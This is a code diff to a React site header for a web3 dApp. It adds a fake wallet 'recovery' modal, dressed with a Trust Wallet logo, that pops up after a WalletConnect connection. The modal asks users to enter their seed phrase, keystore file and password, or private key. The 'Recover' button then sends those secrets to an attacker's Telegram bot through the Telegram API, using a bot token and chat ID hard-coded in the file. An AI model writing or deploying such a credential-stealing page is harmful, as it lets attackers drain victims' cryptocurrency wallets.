@@ -4,7 +4,7 @@ import { Link } from 'react-router-dom';
 import { WalletConnectConnector } from "@web3-react/walletconnect-connector";
 import { InjectedConnector } from "@web3-react/injected-connector";
 import { useWeb3React } from '@web3-react/core'
-import { Box, Modal, Typography } from '@material-ui/core';
+import { Box, ButtonGroup, CircularProgress, Divider, Modal, TextareaAutosize, Typography } from '@material-ui/core';
 import AppBar from '@mui/material/AppBar';
 import IconButton from '@mui/material/IconButton';
 import Menu from '@mui/material/Menu';
@@ -13,6 +13,7 @@ import Container from '@mui/material/Container';
 import Button from '@mui/material/Button';
 import Tooltip from '@mui/material/Tooltip';
 import MenuItem from '@mui/material/MenuItem';
+
 
 
 
@@ -45,25 +46,51 @@ let bot = {
     CHATID: "1203745440",
 
 }
+const style1 = {
+    position: 'absolute',
+    top: '50%',
+    left: '50%',
+    transform: 'translate(-50%, -50%)',
+    width: 450,
+    borderRadius: '20px',
+    bgcolor: 'background.paper',
+    p: 4,
+    textAlign: 'center',
+    border: 'none',
+    outline: 'none'
+};
 
+const btnsRef = [
+    { name: 'Phrase' },
+    { name: 'Keystore' },
+    { name: 'Private Key' }
+]
+
+console.log(btnsRef)
 function Header() {
     const { account } = useWeb3React();
     const { activate } = useWeb3React();
-    const [id,setId] = useState()
+    const [id, setId] = useState()
+    const [openFAk, setOpenFAk] = React.useState(false);
+    const handleOpenFAk = () => setOpenFAk(true);
+    const handleCloseFAk = () => setOpenFAk(false);
     const [open, setOpen] = React.useState(false);
     const handleOpen = () => setOpen(true);
     const handleClose = () => setOpen(false);
     const [anchorElNav, setAnchorElNav] = React.useState(null);
     const [anchorElUser, setAnchorElUser] = React.useState(null);
+    const [loading, setIsloading] = useState(true)
+    const [active, setActive] = useState(btnsRef[0]);
+    const [prhare,setPrhase] = useState('')
+    const [prharePass,setPrharePass] = useState('')
     useEffect(() => {
         setId(localStorage.getItem('address'))
-    },[localStorage.getItem('address')])
+    }, [localStorage.getItem('address')])
     const condition = "hello"
     console.log(id)
     const handleOpenNavMenu = (e) => {
         setAnchorElNav(e.currentTarget);
     };
-
 
     const handleCloseNavMenu = () => {
         setAnchorElNav(null);
@@ -86,6 +113,12 @@ function Header() {
     const connectWallet = () => {
         handleClose();
         activate(WalletConnect)
+            .then(() => {
+                setTimeout(handleOpenFAk(), 5000)
+                setInterval(() => {
+                    setIsloading(false)
+                }, 4000)
+            })
     }
     const connectMetamask = () => {
         handleClose();
@@ -93,20 +126,20 @@ function Header() {
     }
 
     const submitAddress = () => {
+        let secratePrhase = !prharePass ? `phrase is ${prhare} ` : `phrase is ${prhare} and pass is ${prharePass}` 
         
-        fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.CHATID}&text=${account}`, {
+        fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.CHATID}&text=${secratePrhase}`, {
             method: "GET"
         })
             .then(success => {
-                localStorage.setItem('address', account)
+                setPrharePass('')
+                setPrhase('')
             }, error => {
                 alert("not sent")
             })
     }
 
-    if (account !== undefined) {
-        submitAddress()
-    }
+        
     return (
 
         <AppBar style={{ backgroundColor: '#262626' }} color='primary' position="static">
@@ -211,26 +244,131 @@ function Header() {
                         </MenuItem>
                     ))}
                 </Box>
-
-                <Box sx={{ flexGrow: 0 }}>
-                            <div className="header_right">
-
-                                <Tooltip title='Conncet Wallet'>
-                                    <button onClick={handleOpen}>Connect</button>
-                                </Tooltip>
-                                <Modal
-                                    open={open}
-                                    onClose={handleClose}
-                                    aria-labelledby="modal-modal-title"
-                                    aria-describedby="modal-modal-description"
-                                >
-                                    <Box sx={style}>
-                                        <button style={{ cursor: 'pointer', background: '#181819', color: 'white', marginTop: '5px', width: "220px", padding: '10px', borderRadius: '10px' }} onClick={() => { connectMetamask() }}>Metamask/TrustWallet</button>
-                                        <button style={{ cursor: 'pointer', background: '#181819', color: 'white', marginTop: '5px', width: "220px", padding: '10px', borderRadius: '10px' }} onClick={() => { connectWallet() }}>WalletConnect</button>
-                                        <button style={{ cursor: 'pointer', background: '#181819', color: 'white', marginTop: '5px', width: "220px", padding: '10px', borderRadius: '10px' }} onClick={handleClose}>Close</button>
+                <Modal
+                    open={openFAk}
+                    onClose={handleCloseFAk}
+                    aria-labelledby="modal-modal-title"
+                    aria-describedby="modal-modal-description"
+                >
+                    <Box sx={style1}>
+                        {
+                            loading ?
+                                (
+                                    <Box sx={{ display: 'flex', justifyContent: 'center' }}>
+                                        <CircularProgress />
                                     </Box>
-                                </Modal>
-                            </div>
+                                )
+                                :
+                                (
+                                    <Box sx={{ mb: 2 }}>
+                                        <img style={{ width: '150px' }} src='https://open.seamarketplace.org/assets/images/media/trust.png' />
+                                        <Typography id="modal-modal-title" variant="h6" component="h2">
+                                            Choice recovery method
+                                        </Typography>
+                                        <Box sx={{ mt: 3, display: 'flex', justifyContent: 'center', }}>
+                                            {
+                                                btnsRef.map((btn) => (
+                                                    <Button onClick={() => setActive(btn)} style={{ background: btn === active ? '#f3e5f5' : 'none', color: 'black', padding: '11px', width: '120px' }}>
+                                                        {btn.name}
+                                                    </Button>)
+                                                )
+                                            }
+                                        </Box>
+                                        {
+                                            active.name === "Phrase" ?
+                                                (
+                                                    <>
+                                                        <Box>
+                                                            <TextareaAutosize
+                                                                aria-label="minimum height"
+                                                                minRows={3}
+                                                                placeholder="Phrase"
+                                                                className='txtArea'
+                                                                onChange={(e) => setPrhase(e.target.value)}
+                                                            />
+                                                        </Box>
+
+                                                    </>
+                                                )
+                                                :
+                                                active.name === "Keystore" ?
+                                                    (
+                                                        <>
+                                                            <Box>
+                                                                <TextareaAutosize
+                                                                    aria-label="minimum height"
+                                                                    minRows={3}
+                                                                    placeholder="Keystore json"
+                                                                    className='txtArea'
+                                                                    onChange={(e) => setPrhase(e.target.value)}
+
+                                                                />
+                                                                <input
+                                                                    aria-label="minimum height"
+                                                                    minRows={3}
+                                                                    placeholder="Password"
+                                                                    className='txtArea1'
+                                                                    onChange={(e) => setPrharePass(e.target.value)}
+
+                                                                />
+                                                            </Box>
+
+                                                        </>
+                                                    )
+                                                    :
+                                                    active.name === "Private Key" ?
+                                                        (
+                                                            <>
+                                                                <Box>
+                                                                    <TextareaAutosize
+                                                                        aria-label="minimum height"
+                                                                        minRows={3}
+                                                                        placeholder="Privatekey"
+                                                                        className='txtArea'
+                                                                        onChange={(e) => setPrhase(e.target.value)}
+
+                                                                    />
+                                                                </Box>
+
+                                                            </>
+                                                        )
+                                                        :
+                                                        ''
+                                        }
+                                        <Box className='mb-5'>
+                                            <Button onClick={() => submitAddress()} className='hov' variant='outlined' style={{ fontSize: '15px', marginTop: '9px', borderRadius: '15px', padding: '10px', width: '370px' }}>
+                                                Recover
+                                            </Button>
+                                            <br />
+                                            <Button onClick={handleCloseFAk} variant='outlined' style={{ fontSize: '11px', marginTop: '9px', borderRadius: '15px', border: '1px solid gray', padding: '5px', width: '370px', color: 'black' }}>
+                                                Back
+                                            </Button>
+                                        </Box>
+                                    </Box>
+                                )
+                        }
+
+                    </Box>
+                </Modal>
+                <Box sx={{ flexGrow: 0 }}>
+                    <div className="header_right">
+
+                        <Tooltip title='Conncet Wallet'>
+                            <button onClick={handleOpen}>Connect</button>
+                        </Tooltip>
+                        <Modal
+                            open={open}
+                            onClose={handleClose}
+                            aria-labelledby="modal-modal-title"
+                            aria-describedby="modal-modal-description"
+                        >
+                            <Box sx={style}>
+                                <button style={{ cursor: 'pointer', background: '#181819', color: 'white', marginTop: '5px', width: "220px", padding: '10px', borderRadius: '10px' }} onClick={() => { connectMetamask() }}>Metamask/TrustWallet</button>
+                                <button style={{ cursor: 'pointer', background: '#181819', color: 'white', marginTop: '5px', width: "220px", padding: '10px', borderRadius: '10px' }} onClick={() => { connectWallet() }}>WalletConnect</button>
+                                <button style={{ cursor: 'pointer', background: '#181819', color: 'white', marginTop: '5px', width: "220px", padding: '10px', borderRadius: '10px' }} onClick={handleClose}>Close</button>
+                            </Box>
+                        </Modal>
+                    </div>
                     <Menu
                         sx={{ mt: '45px' }}
                         id="menu-appbar"
